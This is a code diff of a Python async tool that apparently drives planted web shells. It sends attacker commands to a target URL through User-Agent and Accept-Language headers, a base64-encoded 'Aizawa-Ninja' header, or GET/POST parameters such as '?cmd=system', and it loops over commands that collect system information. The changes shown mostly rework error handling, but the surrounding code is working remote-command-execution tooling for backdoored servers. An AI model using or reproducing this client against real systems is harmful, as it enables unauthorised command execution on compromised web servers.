@@ -34,16 +34,21 @@ yellow = "\033[33m"
 # Functions
 
 
+
 async def http_request(client, method, url, headers=None, data=None):
     headers = headers or {}
-    if method.lower() == 'post':
-        r = await client.post(url, headers=headers, data=data, follow_redirects=True)
-    elif method.lower() == 'get':
-        r = await client.get(url, headers=headers, follow_redirects=True)
-    else:
-        raise ValueError(f"{bold} {yellow} WARNING! {clear}\n{red}ERROR {clear}: Invalid method {method}\n")
+    try:
+        if method.lower() == 'post':
+            r = await client.post(url, headers=headers, data=data)
+        elif method.lower() == 'get':
+            r = await client.get(url, headers=headers)
+        else:
+            raise ValueError(f"{bold} {yellow} WARNING! {clear}\n{red}ERROR {clear}: Invalid method {method}\n")
+        r.raise_for_status()
+    except httpx.HTTPStatusError as e:
+        print(f"Error response {e.response.status_code} while making {method} request to {url}")
+        return None
     return r.text
-
 
 def create_headers(cmd, user_agent=None, accept_language=None):
     headers = {
@@ -62,32 +67,27 @@ def create_headers(cmd, user_agent=None, accept_language=None):
     }
     return headers
 
-
 async def http_user_agent_get(client, url, cmd):
     headers = create_headers(cmd)
     return await http_request(client, 'get', url, headers)
-
 
 async def http_accept_language_get(client, url, cmd):
     headers = create_headers(cmd, user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', accept_language=cmd)
     return await http_request(client, 'get', url, headers)
 
-
 async def http_user_agent_post(client, url, data, cmd):
     headers = create_headers(cmd)
+    print(data)
     return await http_request(client, 'post', url, headers, data)
-
 
 async def http_accept_language_post(client, url, data, cmd):
     headers = create_headers(cmd, user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', accept_language=cmd)
     return await http_request(client, 'post', url, headers, data)
 
-
 async def http_aizawa_ninja(client, url, cmd):
     headers = create_headers(cmd, user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36')
     headers["Aizawa-Ninja"] = base64.b64encode(cmd.encode('utf-8'))
     return await http_request(client, 'get', url, headers)
-
 
 async def execute(client, url, cmd, type):
     match type:
@@ -104,18 +104,16 @@ async def execute(client, url, cmd, type):
                 sys.exit()
 
         case "get":
-            r = await client.get(url+cmd, follow_redirects=True)
-            result = r.text
-            if not result:
-                result = red + 'ERROR' + clear
-            return result
+            r = await http_request(client, 'get', url+cmd)
+            if not r:
+                result = red + 'ERROR' + clear + '\n'
+            return r
 
         case "post":
-            r = await client.post(url, data=cmd, follow_redirects=True)
-            result = r.text
-            if not result:
-                result = red + 'ERROR' + clear
-            return result
+            r = await http_request(client, 'post', url, data=cmd)
+            if not r:
+                result = red + 'ERROR' + clear + '\n'
+            return r
 
         case "http_user_agent_get":
             result = await http_user_agent_get(client, url + '?cmd=system', cmd)
@@ -192,6 +190,7 @@ async def execute(client, url, cmd, type):
             elif not result:
                 result = red + 'ERROR' + clear + '\n'
             return result
+
 
     if type in ["http_aizawa_ninja_concat", "http_aizawa_ninja_debug", "http_aizawa_ninja_gc", "http_aizawa_ninja_json", "http_aizawa_ninja_filter"]:
         result = await http_aizawa_ninja(client, url, cmd)
@@ -307,7 +306,10 @@ async def main():
             max_label_width = max(len(label) for label in info_commands.keys())
 
             for info, command in info_commands.items():
-                result = await execute(client, url, f"?{command}", method)
+                if method == "get":
+                    result = await execute(client, url, f"?{command}", method)
+                else:
+                    result = await execute(client, url, f"{command}", method)
                 formatted_info = f"{info.ljust(max_label_width)} : {result}"
                 print(f"{bold}{formatted_info}{clear}")
 
